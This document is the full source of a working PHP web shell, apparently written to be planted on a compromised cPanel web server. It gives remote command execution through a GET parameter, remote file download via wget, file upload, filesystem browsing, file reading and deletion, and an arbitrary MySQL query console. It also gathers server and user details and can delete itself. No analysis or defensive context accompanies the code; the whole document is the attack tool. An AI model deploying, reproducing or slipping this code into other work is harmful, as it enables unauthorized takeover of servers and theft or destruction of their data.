<style type="text/css">
body{background-color:#000;color:#7F7F7F;font-family:Verdana;font-size:11px}
b{color:white}
form{display:inline}
input,textarea,select{color:white;background-color:#2F2F2F;border:1px solid #4F4F4F;font-family:Verdana;font-size:11px;}
iframe{border:1px solid #4F4F4F}
a{color:#01AEF4;text-decoration:none}
td{font-family:Verdana;font-size:11px}
</style>
<?php
error_reporting(0);
if (isset($_GET['k'])) {
  if (unlink(basename($_SERVER['PHP_SELF']))) {
    die("Deleted");
  } else {
    echo("Failed to delete<br>");
  }
}
if (isset($_GET['c'])) {
  echo "<code style=\"white-space:nowrap\">";
  passthru($_GET['c'] . ' 2>&1 | sed \'s/$/<br>/g\'');
  echo "</code>";
  exit;
}
if (isset($_GET['g'])) {
  echo "<code style=\"white-space:nowrap\">";
  echo file_get_contents("http://" . $_GET['g']);
  echo "</code>";
  exit;
}
if (isset($_GET['d'])) {
  unlink($_GET['p'] . '/' . $_GET['d']);
}
if (isset($_GET['f'])) {
  $dir = $_GET['p'];
  echo '<form method="GET"><input type="hidden" name="p" value="' . $dir . '"><input type="submit" value="Go back"></form> <form method="GET"><input type="hidden" name="p" value="' . $dir . '"><input type="hidden" name="d" value="' . $_GET['f'] . '"><input type="submit" value="Delete"></form> &nbsp; Showing ' . $dir . '/' . $_GET['f'] . '<br><br>';
  echo "<textarea style=\"width:100%;height:95%\">";
  echo htmlentities(file_get_contents($_GET['p'] . '/' . $_GET['f']));
  echo "</textarea>";
  exit;
}
if (isset($_GET['u']) || isset($_POST['u'])) {
  $dir = $_GET['p'];
  if (!$_POST['ur']) { echo '<form method="GET"><input type="hidden" name="p" value="' . $dir . '"><input type="submit" value="Go back"></form><br><br>'; }
  if ($_POST['ur']) {
    $filex = array_pop(explode("/", $_POST['ur']));
    if (exec("wget {$_POST['ur']} -b -O $dir/$filex")) {
      echo 'File has been uploaded.<br>';
    } else {
      echo 'File upload failed.<br>';
    }
  } elseif ($_FILES['up']) {
    move_uploaded_file($_FILES['up']["tmp_name"], $dir . "/" . $_FILES['up']["name"]);
    echo 'File has been uploaded.<br>';
  } else {
    echo '<form enctype="multipart/form-data" method="POST">';
    echo '<input type="hidden" name="u">';
    echo '<b>Output Directory</b><br><input type="text" name="p" size="65" value="' . $dir . '"><br><br>';
    echo '<b>Remote Grab</b><br><input type="text" name="ur" size="65"><input type="submit" value="Grab"><br><br>';
    echo '<b>File Upload</b><br><input type="file" name="up" size="65"><input type="submit" value="Upload">';
    echo '</form>';
    exit;
  }
}
$curdir = cleandir(getcwd());
if (isset($_GET['p'])) {
  $dir = $_GET['p'];
  if ($dir) {
    $dir = cleandir($dir);
  }
  $dirx = explode("/", $dir);
  $files = array();
  $folders = array();
  echo '<form method="GET"><input type="text" name="p" value="' . $dir . '" size="90"><input type="submit" value="Go"></form><br>';
  echo '<form method="GET"><input type="hidden" name="p" value="' . $dir . '"><input type="submit" name="u" value="Upload a file"></form>';
  echo '<table><tr><td><b>Name</b></td><td></td><td><b>Size</b></td><td></td><td><b>Change Time</b></td><td></td><td><b>Modified Time</b></td><td></td><td><b>Access Time</b></td><td><b></b></td></tr>';
  if ($handle = opendir($dir)) {
    while (false != ($link = readdir($handle))) {
      if (is_dir($dir . '/' . $link)) {
        $file = array();
        $file['perm'] = 'none';
        if (is_writable($dir . '/' . $link)) {
          $file['perm'] = 'write';
        } elseif (is_readable($dir . '/' . $link)) {
          $file['perm'] = 'read';
        }
        $color = '#D00';
        if ($file['perm'] == "write") {
          $color = '#0C0';
        } elseif ($file['perm'] == "read") {
          $color = '#EE0';
        }
        @$file['link'] = "<a href='?p=$dir/$link'><font color='$color'>$link</font></a>";
        $file['ctime'] = date("y-m-d H:i:s", filectime("$dir/$link"));
        $file['mtime'] = date("y-m-d H:i:s", filemtime("$dir/$link"));
        $file['atime'] = date("y-m-d H:i:s", fileatime("$dir/$link"));
        $folder = "<tr><td>" . $file['link'] . "</td><td></td><td>-</td><td></td><td>" . $file['ctime'] . "</td><td></td><td>" . $file['mtime'] . "</td><td></td><td>" . $file['atime'] . "</td></tr>";
        array_push($folders, $folder);
      } else {
        $file = array();
        $ext = strtolower(end(explode(".", $link)));
        if (!$file['size'] = nicesize(@filesize($dir . '/' . $link))) {
          $file['size'] = "0B";
        }
        $file['perm'] = 'none';
        if (is_writable($dir . '/' . $link)) {
          $file['perm'] = 'write';
        } elseif (is_readable($dir . '/' . $link)) {
          $file['perm'] = 'read';
        }
        $color = '#D00';
        if ($file['perm'] == "write") {
          $color = '#0C0';
        } elseif ($file['perm'] == "read") {
          $color = '#EE0';
        }
        @$file['link'] = "<a href='?f=$link&p=$dir'><font color='$color'>$link</font></a>";
        $file['ctime'] = date("y-m-d H:i:s", filectime("$dir/$link"));
        $file['mtime'] = date("y-m-d H:i:s", filemtime("$dir/$link"));
        $file['atime'] = date("y-m-d H:i:s", fileatime("$dir/$link"));
        $file = "<tr><td>" . $file['link'] . "</td><td></td><td>" . $file['size'] . "</td><td></td><td>" . $file['ctime'] . "</td><td></td><td>" . $file['mtime'] . "</td><td></td><td>" . $file['atime'] . "</td><td></td><td><a href='?d=$link&p=$dir'>Delete</a></td></tr>";
        array_push($files, $file);
      }
    }
    natcasesort($folders);
    foreach ($folders as $folder) {
      echo $folder;
    }
    natcasesort($files);
    foreach ($files as $file) {
      echo $file;
    }
    echo("</table>");
    closedir($handle);
  }
  exit;
}
elseif (isset($_GET['q'])) {
  $sql_user = $_GET['qu'];
  $sql_pass = $_GET['qp'];

  echo '<form name="sql_form" method="GET">';

  if(isset($sql_user)) {
    $link = mysql_connect('localhost', $sql_user, $sql_pass);
    if(!$link) {
      echo "mysql error: ".mysql_error();
    }
    echo "<input type=\"hidden\" name=\"qu\" value=\"$sql_user\" />";
    echo "<input type=\"hidden\" name=\"qp\" value=\"$sql_pass\" />";
    echo '<form method="GET" action="">';
    echo 'Database: <select name="qd">';
    if($link){
      $result = mysql_query('SHOW DATABASES');
      if(!$result) {
        echo "mysql error: ".mysql_error();
      } else {
        echo "query returned ".mysql_num_rows($result)." rows<br><br>";
        echo "<option></option>";
        $i = 1;
        while($row = mysql_fetch_assoc($result)) {
          if(isset($_GET['qd']) && $_GET['qd'] == $row['Database']) {
            echo "<option selected>{$row['Database']}</option>";
          } else {
            echo "<option>{$row['Database']}</option>";
          }
        }
      }
    }
    echo '</select><input type="submit" name="q" value="Get Tables" /><br>';
    if(isset($_GET['qd'])) {
      echo 'Table: <select name="qt">';
      if($link) {
        $result = mysql_query('SHOW TABLES IN '.$_GET['qd']);
        if(!$result) {
          echo "mysql error: ".mysql_error();
        } else {
          echo "query returned ".mysql_num_rows($result)." rows<br><br>";
          echo "<option></option>";
          $i = 1;
          while($row = mysql_fetch_array($result)) {
            $table = $row[0];
            if(isset($_GET['qt']) && $_GET['qt'] == $table) {
              echo "<option selected>$table</option>";
            } else {
              echo "<option>$table</option>";
            }
          }
        }
      }
      echo '</select><input type="submit" name="q" value="Get Rows" /><br>';
    }
    echo '<input type="text" size="100" id="cmdbox" value="'.$_GET['qc'].'" name="qc" /><input type="submit" name="q" value="Execute" /></form><br>';
    if((isset($_GET['qt']) && $_GET['qt'] != "") && (!isset($_GET['qc']) || $_GET['qc'] == "")) {
      $_GET['qc'] = "SELECT * FROM {$_GET['qt']}";
    }
    if(isset($_GET['qc'])) {
      echo "executing command '{$_GET['qc']}'<br>";
      if($link) {
        if(isset($_GET['qd'])) {
          mysql_select_db($_GET['qd']) or die("mysql error: ".mysql_error());
        }
        $result = mysql_query($_GET['qc']);
        if(!$result) {
          echo "mysql error: ".mysql_error();
        } else {
          echo "query returned ".mysql_num_rows($result)." rows<br><br>";
          $first = true;
          echo "<table>";
          while($row = mysql_fetch_assoc($result)) {
            if($first) {
              echo "<tr>";
              foreach($row as $key => $val) {
                echo "<td>$key</td>";
              }
              echo "</tr>";
            }
            echo "<tr>";
            foreach($row as $key => $val) {
              echo "<td style=\"background-color:#564C42;color:#BDAA72\">$val</td>";
            }
            $first = false;
            // print_r($row);
            echo "</tr>";
          }
          echo "</table>";
        }
      }
    }
    if($link) {
      mysql_close();
    }
  } else {
    echo 'SQL User: <input type="text" name="qu" size="40" /><br>';
    echo 'SQL Pass: <input type="text" name="qp" size="40" /><br>';
    echo '<input type="submit" name="q" value="Go" />';
  }

  echo '</form>';

  exit;
}
function cleandir($d)
{
  $d = realpath($d);
  $d = str_replace("\\\\", "//", $d);
  $d = str_replace("////", "//", $d);
  $d = str_replace("\\", "/", $d);
  return($d);
}
function nicesize($size)
{
  if (!$size) {
    return false;
  }
  if ($size >= 1073741824) {
    return(round($size / 1073741824) . " GB");
  } elseif ($size >= 1048576) {
    return(round($size / 1048576) . " MB");
  } elseif ($size >= 1024) {
    return(round($size / 1024) . " KB");
  } else {
    return($size . " B");
  }
}

?><body><?php
echo "<b>Software:</b> " . $_SERVER["SERVER_SOFTWARE"] . "<br>";
echo "<b>Uname:</b> " . php_uname() . "<br>";
$mode = "OFF";
if (@ini_get('safe_mode') != "") {
  $mode = "ON";
}
echo "<b>Safemode:</b> $mode<br>";
echo "<b>User:</b> " . @exec('whoami') . "<br>";
echo "<b>ID:</b> " . @exec('id') . "<br>";
echo "<b>Domain:</b> " . @exec("grep -m 1 ^DNS /var/cpanel/users/$(whoami) | grep -v '\..*\.' | cut -d= -f2") . "<br>";
echo "<b>Shell Dir:</b> $curdir<br>";

?><br>
<form target="output" method="GET" action=""><input type="text" size="100" id="cmdbox" name="c" /><input type="submit" value="Execute" /></form><br>
<form target="output" method="GET" action=""><input type="hidden" name="c" value="cat /var/cpanel/users/$(whoami)" /><input type="submit" value="DNS File" /></form>
<form target="output" method="GET" action=""><input type="hidden" name="c" value="grep ^DNS /var/cpanel/users/$(whoami) | grep -v '\..*\.' | cut -d= -f2" /><input type="submit" value="List Domains" /></form>
<form target="output" method="GET" action=""><input type="hidden" name="k" /><input type="submit" value="Kill me" /></form>
<iframe src="" name="output" width="100%" height="200"></iframe><br>
<br>
<form target="files" method="GET" action=""><input type="hidden" name="p" value="<?php echo $curdir; ?>" /><input type="submit" value="File list" /></form>
<form target="files" method="GET" action=""><input type="submit" name="q" value="MySQL" /></form>
<iframe src="?p=<?php echo $curdir; ?>" name="files" width="100%" height="500" style="border:0"></iframe>
</body>